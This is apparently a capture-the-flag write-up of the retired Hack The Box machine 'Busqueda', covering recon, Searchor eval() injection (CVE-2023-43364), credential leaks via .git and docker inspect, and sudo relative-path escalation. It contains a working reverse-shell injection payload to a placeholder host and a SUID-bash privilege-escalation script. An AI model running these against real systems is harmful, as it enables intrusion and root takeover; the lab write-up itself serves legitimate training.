---
machine: Busqueda
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Injection
state: Retired
tags: [searchor, cve-2023-43364, eval, gitea, docker, sudo]
---

# Busqueda — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

The site runs **Searchor 2.4.0**, whose `eval()` over the search URL is **Python code injection** (CVE-2023-43364) → shell as `svc`. An exposed `.git` in `/var/www/app` yields **Gitea** credentials; Gitea runs locally, `docker inspect` leaks its **database** password, and the `administrator` account reuses `cody`'s password. `system-checkup.py` runs as root through `sudo` and calls `./full-checkup.sh` by **relative path**: root shell.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
# 22 ssh, 80 http (Apache, searcher.htb)
```

```bash
git-dumper http://searcher.htb/ /tmp/app
cd /tmp/app && git log -p | grep -iE 'password|user'
```

## Access

```text
/search?engine=Google&query=test'
```

The `'` breaks the `eval`; escape it and append code:

```python
'+__import__('os').system('bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"')+'
```

Shell as `svc`.

## Escalation

1. **Gitea** on `127.0.0.1:3000`; the site's `.git` held a user's credentials.
2. `sudo -l`:

```text
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

3. `docker-inspect` on the `gitea` container dumps its environment, including the **database** password (`GITEA__database__PASSWD`); the `administrator` account reuses `cody`'s password. The Gitea repo holds the script source.
4. `full-checkup` runs `./full-checkup.sh` from the **current directory**:

```bash
printf '#!/bin/bash\nchmod +s /bin/bash\n' > full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

## Pitfalls

- **Tunnel to 3000**: `ssh -L 3000:127.0.0.1:3000 svc@<IP>` to reach Gitea.
- **Relative path**: run from another directory and the script fails ("Something went wrong").
- **Quoting the `eval`**: close the string exactly as Searchor builds it.

## Lessons

- `eval()` on user input is code execution, not "search".
- A reachable `.git` is a credential history.
- `sudo` on a script calling relative paths is root with a file in the current directory.
